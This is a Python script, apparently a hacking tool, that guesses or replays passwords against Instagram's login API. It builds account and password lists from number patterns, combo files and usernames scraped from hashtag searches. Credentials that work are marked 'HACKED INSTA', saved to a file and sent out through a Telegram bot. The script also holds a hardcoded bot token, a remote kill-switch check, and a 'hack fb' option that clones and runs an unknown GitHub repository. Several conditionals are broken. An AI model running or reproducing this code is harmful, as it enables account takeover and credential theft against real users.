from datetime import datetime
try:
	import requests
	import os
	import sys
	import time
	import random
	import json
	import colorama
	import hashlib
	import string
	from colorama import Fore
except ImportError:
	os.system('pip2 install requests;pip2 install colorama;pkg install random;python3 fbx.py')


user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
instagram_link = 'https://www.instagram.com'
accept = '*/*'
address = '936619743392459'
speek = '?0'
headers={'accept': accept,'accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '282','content-type': 'application/x-www-form-urlencoded','cookie': 'csrftoken=Z23MdmsOaneIBPSuevdvZ029aMVWl6vw; mid=YJHiTgALAAGMKBeVSlMKDoCAq3cC; ig_did=B77ECEEB-5C81-43CC-AA42-7108227B197C; ig_nrcb=1','origin': instagram_link,'referer': instagram_link,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"','sec-ch-ua-mobile': speek,'sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': user_agent,'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw','x-ig-app-id': address,'x-ig-www-claim': '0','x-instagram-ajax': '05b80a16b1ac','x-requested-with': 'XMLHttpRequest',}
url_insta="https://www.instagram.com/accounts/login/ajax/"
head = {
'user-agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23'
}
token_login = '1900383494:AAHDULWvI-SniaLQXXS8h6htov21u4pgvEo'
id_login = '907455477'

def Option(): 
  Code = "Tools"
  try: 
    Status = requests.get("https://raw.githubusercontent.com/hal012/activt/main/TOOLS.txt").text 
    if Code in Status: 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[97mEror 404 Ragirawa\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     Option() 
    
Option()

import os
from time import sleep
clear = lambda : os.system('cls')
pl = "=============================="
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()

color3 = fg(2)
color4 = fg('9')    
def close():
    input('- Press Enter To Exit /')
    sys.exit()
    
  





clear()
os.system('color a')
def banner():
    os.system('clear')
    
    print("""
'                             
 ██ ▄█▀ █    ██  ██▀███  ▓█████▄  ▒█████  
 ██▄█▒  ██  ▓██▒▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒
▓███▄░ ▓██  ▒██░▓██ ░▄█ ▒░██   █▌▒██░  ██▒
▓██ █▄ ▓▓█  ░██░▒██▀▀█▄  ░▓█▄   ▌▒██   ██░
▒██▒ █▄▒▒█████▓ ░██▓ ▒██▒░▒████▓ ░ ████▓▒░
▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░ 
░ ░▒ ▒░░░▒░ ░ ░   ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░ 
░ ░░ ░  ░░░ ░ ░   ░░   ░  ░ ░  ░ ░ ░ ░ ▒  
░  ░      ░        ░        ░        ░ ░  
                          ░               
                                              
""")
banner()
print("")
print("\n[!] Done Download All Libareis ")
h , b,s,block = 0,0,0,0
#psrd = input("""[×] Tool PassWord ==> """)
#if (psrd == thepass):
#    banner()
#else:
#    print("Wrong Password\nMessage me to give you the password")
#    os.system("xdg-open https://t.me/whisper666bot")
#    exit()
tele = input("[+] Send Hacked Accounts to Telegram Y/N ?: ")
if "Y" in tele:
    id = input("[+] ID ==> ")
    bot = input("[+] Token ==> ")
elif "y" in tele:
    id = input("[+] ID ==> ")
    bot = input("[+] Token ==> ")
print(pl)
tlps = input("""[1] Checker insta  Auto Number:Number\n[2] Checker Number:Pass\n[3] Checker List User + Pass\n[4] Checker E-mail:Pass
[5]checker combo
[6]hack fb  [facebook]\n===============================\n[÷] Choose ==> """)
if tlps == "1":
   
    make = '1234567890'
    clear()
    banner()
    uss = input('[+] Number Domail ==> ')
    print(pl)
    pss = input('[+] PassWord Domain ==> ')
    print(pl)
    rng = input('[+] Numbers After Domain ==> ')
    print(pl)
    rng = int(rng)
    print("")
    print(f"\r            [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(rng))))
        user = uss + us
        pasw = pss + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(f"{user}==>{pasw}")
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=- HACKED INSTA❤.\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @itzthedevil")
            open("Hited user.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes before you try again.' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
if tlps == "2":
   
    make = '1234567890'
    clear()
    banner()
    uss = input('[+] Number Domail ==> ')
    print(pl)
    rng = input('[+] Numbers After Domain ==> ')
    print(pl)
    rng = int(rng)
    pss = input('[+] Enter Password ==> ')
    print(pl)
    print("")
    print(f"\r            [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(rng))))
        user = uss + us
        pasw = pss
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=- HACKED INSTA❤.\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @itzthedevil")
            open("Hited user.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes before you try again.' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
if tlps == "3":
    banner()
    print(f"[1] Get Users From Hashtags\n{pl}\n[2] Start Check\n{pl}\n")
    hash = input("[×] Choose ==> ")
if hash == "2":
    empas = ("user.txt")
    empas = open(empas, 'r').readlines()
    #make = '1234567890'
    clear()
    banner()
    uss = empas[0]
    print(pl)
    #rng = input('[+] Numbers After Domain ==> ')
    #print(pl)
    #rng = int(rng)
    pss = input('[+] Enter Password ==> ')
    print(pl)
    print("")
    print(f"\r            [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        #us = str(''.join((random.choice(make) for i in range(rng))))
        user = uss# + us
        pasw = pss
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=- HACKED INSTA❤.\n====================\n[=] User : {user}[=] Pass : {pasw}\n====================\nCh : @itzthedevil")
            open("Hited user.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes before you try again.' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
if hash == "1":
    os.system('rm user.txt')
    import requests, secrets, sys as n, time as mm
    from time import sleep
    jruksr = '\x1b[1;32m'
    jruks = '\x1b[1;33m'
    ruks_q = '\x1b[1;36m'
    ruks_h = '\x1b[1;31m'
    print(ruks_q + '============================================================')
    banner()
    print(ruks_q + '============================================================')
    head = {'HOST':'www.instagram.com', 
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
     'Cookie':'cookie', 
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'missing', 
     'X-CSRFToken':'missing', 
     'Accept-Language':'en-US,en;q=0.9'}
    ruks = requests.Session()
    rhaby = 'welcome to hashtag user'
    m1 = input('Hashtag_1 : ' + ruks_h)
    m2 = input('Hashtag_2 : ' + ruks_q)
    m3 = input('Hashtag_3 : ' + ruks_h)
    m4 = input('Hashtag_4 : ' + ruks_q)
    m5 = input('Hashtag_5 : ' + ruks_h)
    m6 = input('Hashtag_6 : ' + ruks_q)
    m7 = input('Hashtag_7 : ' + ruks_h)
    m8 = input('Hashtag_8 : ' + ruks_q)
    m9 = input('Hashtag_9 : ' + ruks_h)
    m10 = input('Hashtag_10 : ' + ruks_q)
    print('The tool is kurdo, yes for sale')
    print('============================================================')

    def ruks1():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m1}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks1()

    def ruks2():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m2}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks2()

    def ruks3():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m3}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks3()

    def ruks4():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m4}"
            ruks = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                fileuser.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks4()

    def ruks5():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m5}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks5()

    def ruks6():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m6}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
                print(u'\u0646\u062a\u0647\u0649 \u0627\u0644\u0633\u062d\u0628')
                print(u' \u0641\u064a \u0644\u0633\u062a\u0629 user.txt ')
            finally:
                e = None
                del e


    ruks6()

    def ruks7():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m7}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks7()

    def ruks8():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m8}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks8()

    def ruks9():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m9}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks9()

    def ruks10():
        try:
            url_id = f"https://www.instagram.com/web/search/topsearch/?context=blended&query=25.{m10}"
            mn = 0
            req_id = ruks.get(url_id, headers=head).json()
            while True:
                mn += 1
                y = str(req_id['users'][mn]['user']['username'])
                with open('user.txt', 'a') as (x):
                    x.write(y + '\n')
                print((f"{y}"))

        except Exception as e:
            try:
                print('============================================================')
            finally:
                e = None
                del e


    ruks10()
if tlps == "4":
   
    make = '1234567890'
    clear()
    banner()
    uss = input("[÷] Name ==> ")
    print(pl)
    pss = input("[÷] PassWord ==> ")
    print(pl)
    dom = input("[÷] E-mail Domain ==> ")
    print(pl)
    rng = input("[÷] Numbers After Name ==> ")
    rng = int(rng)
    print(pl)
    print("")
    print(f"\r            [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    while True:
        us = str(''.join((random.choice(make) for i in range(rng))))
        user = uss + us + dom
        pasw = pss
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=- HACKED INSTA❤.\n====================\n[=] User : {user}[=] Pass : {pasw}\n====================\nCh : @itzthedevil")
            open("Hited user.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes before you try again.' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            
            
if tlps == "5":
    os.system('clear')
    co = input("\033[1;91mCOMBO: ")
    if '.txt' in co:
        pass
    else:
        co  = co + '.txt'
   
    os.system('clear')
    print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
    acc = open(co,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
         
            h += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
if tlps == "6":
        
 os.system('git clone https://github.com/TURKNNEJDJDJD/MMMMMM ; cd MMMMMM ;python3 RM1.py')
